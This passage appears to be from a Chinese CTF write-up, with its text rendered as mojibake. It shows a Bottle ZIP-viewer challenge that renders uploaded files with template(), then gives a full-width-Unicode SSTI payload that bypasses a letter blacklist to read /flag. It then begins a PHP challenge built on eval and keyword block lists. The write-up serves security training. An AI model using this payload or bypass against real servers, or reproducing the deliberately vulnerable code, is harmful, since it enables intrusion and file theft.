&lt;div class=&quot;row mt-5&quot; id=&quot;features&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ›¡ï¸&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å®‰å…¨æ£€æµ‹&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç³»ç»Ÿä¼šè‡ªåŠ¨æ£€æµ‹ä¸Šä¼ æ–‡ä»¶ï¼Œé˜²æ­¢è·¯å¾„éå†æ”»å‡»å’Œæ¶æ„å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“„&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å†…å®¹é¢„è§ˆ&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç›´æ¥åœ¨çº¿æŸ¥çœ‹ZIPæ–‡ä»¶ä¸­çš„æ–‡æœ¬å†…å®¹ï¼Œæ— éœ€ä¸‹è½½&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;âš¡&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å¿«é€Ÿå¤„ç†&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;é«˜æ•ˆå¤„ç†å°äº1MBçš„ZIPæ–‡ä»¶ï¼Œå¿«é€Ÿè·å–å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸Šä¼ é¡µé¢&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ ZIPæ–‡ä»¶&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-primary text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;ğŸ“¤ ä¸Šä¼ ZIPæ–‡ä»¶&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;upload-form&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;fileInput&quot; class=&quot;form-label&quot;&gt;é€‰æ‹©ZIPæ–‡ä»¶ï¼ˆæœ€å¤§1MBï¼‰&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input class=&quot;form-control&quot; type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;.zip&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class=&quot;form-text&quot;&gt;ä»…æ”¯æŒ.zipæ ¼å¼çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å¤§å°ä¸è¶…è¿‡1MB&lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“¤ ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        â†©ï¸ è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¤„ç†æ–‡ä»¶ä¸Šä¼ &quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;è¯·ä¸Šä¼ æœ‰æ•ˆçš„ZIPæ–‡ä»¶&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;æ–‡ä»¶å¤§å°è¶…è¿‡é™åˆ¶(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;å¤„ç†ZIPæ–‡ä»¶æ—¶å‡ºé”™: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ æˆåŠŸ&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-success text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;âœ… ä¸Šä¼ æˆåŠŸ!&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">                            âœ… æ–‡ä»¶å·²æˆåŠŸä¸Šä¼ å¹¶è§£å‹</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        &lt;h5&gt;æ–‡ä»¶åˆ—è¡¨:&lt;/h5&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;list-group mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            % for file in files:</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;span&gt;ğŸ“„ &#123;&#123;file&#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;file&#125;&#125;&quot; class=&quot;btn btn-sm btn-outline-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                    æŸ¥çœ‹</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            % end</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        % if files:</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;files[0]&#125;&#125;&quot; class=&quot;btn btn-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ‘€ æŸ¥çœ‹ç¬¬ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        % end</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/upload&quot; class=&quot;btn btn-outline-primary me-2&quot;&gt;</span></span><br><span class="line"><span class="string">                        â• ä¸Šä¼ å¦ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        ğŸ  è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶ä¸å­˜åœ¨&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;è¯·æ±‚çš„è·¯å¾„ä¸æ˜¯æ–‡ä»¶&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;éæ³•è®¿é—®å°è¯•&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æ— æ³•è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆå¯èƒ½æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶å†…å®¹åŒ…å«ä¸å…è®¸çš„å…³é”®è¯&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;æ¸²æŸ“é”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é™æ€æ–‡ä»¶æœåŠ¡&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;è®¨åŒå•¦ä¸æ˜¯è¯´å¥½åªçœ‹çœ‹ä¸æ‘¸çš„å—&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ä¸è¦é€è¿›æ¥å•Šå•Šå•Šå•Š&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åŸç¥ï¼Œå¯åŠ¨!</span></span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨æºç  <code>view_file</code> å‡½æ•°ä¸­ï¼Œç›´æ¥å°†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ä¼ é€’ç»™äº† Bottle æ¡†æ¶çš„ <code>template()</code> å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> template(content)</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„SSTIæ¼æ´</p>
<p>ä½†æºç ä¸­å®šä¹‰äº†ä¸¥æ ¼çš„ <code>BLACKLIST</code>ï¼Œè¿‡æ»¤äº†ç»å¤§å¤šæ•°å°å†™å­—æ¯ï¼ˆåŒ…æ‹¬ <code>o</code>, <code>p</code>, <code>e</code>, <code>n</code>, <code>r</code>, <code>e</code>, <code>a</code>, <code>d</code> ç­‰ï¼‰ä»¥åŠç‰¹æ®Šç¬¦å·ï¼ˆ<code>%</code>, <code>;</code>, <code>&lt;</code>, <code>&gt;</code> ç­‰ï¼‰ã€‚</p>
<p><strong>åˆ©ç”¨ Python 3 çš„ Unicode æ ‡å‡†åŒ–ç‰¹æ€§ (NFKC)</strong>ã€‚Python 3 è§£é‡Šå™¨åœ¨è§£æä»£ç æ—¶ï¼Œä¼šå°†<strong>å…¨è§’å­—ç¬¦</strong>å’Œå…¶ä»–å…¼å®¹å­—ç¬¦æ ‡å‡†åŒ–ä¸ºå¯¹åº”çš„ ASCII å­—ç¬¦ã€‚</p>
<p>ä¾‹å¦‚ï¼ŒPython è§£é‡Šå™¨æ‰§è¡Œæ—¶ï¼Œ<code>ï½ï½ï½…ï½</code> ä¼šè¢«è§£æä¸º <code>open</code> å‡½æ•°ã€‚</p>
<p>æœ€ç»ˆ Payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ï½ï½ï½…ï½(<span class="string">&#x27;/flag&#x27;</span>).ï½’ï½…ï½ï½„() &#125;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>åœ¨ä¸­æ–‡è¾“å…¥æ³•çŠ¶æ€ä¸‹ï¼ŒæŒ‰ <code>Shift + Space</code> åˆ‡æ¢åˆ°â€œå…¨è§’æ¨¡å¼â€ï¼Œç„¶åè¾“å…¥ <code>open</code> å’Œ <code>read</code>ã€‚</p>
</li>
<li><p>æ–°å»ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶<code>payload.txt</code>ï¼Œä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨å†™å…¥ä»¥ä¸‹å†…å®¹ï¼ˆæ³¨æ„å…¨è§’å’ŒåŠè§’çš„æ··åˆï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ï½ï½ï½…ï½(<span class="string">&#x27;/flag&#x27;</span>).ï½’ï½…ï½ï½„() &#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å°† <code>payload.txt</code> å‹ç¼©ä¸º <code>payload.zip</code>åä¸Šä¼ </p>
</li>
</ol>
<hr>
<h1 id="3-Bypass"><a href="#3-Bypass" class="headerlink" title="3. Bypass"></a>3. Bypass</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span 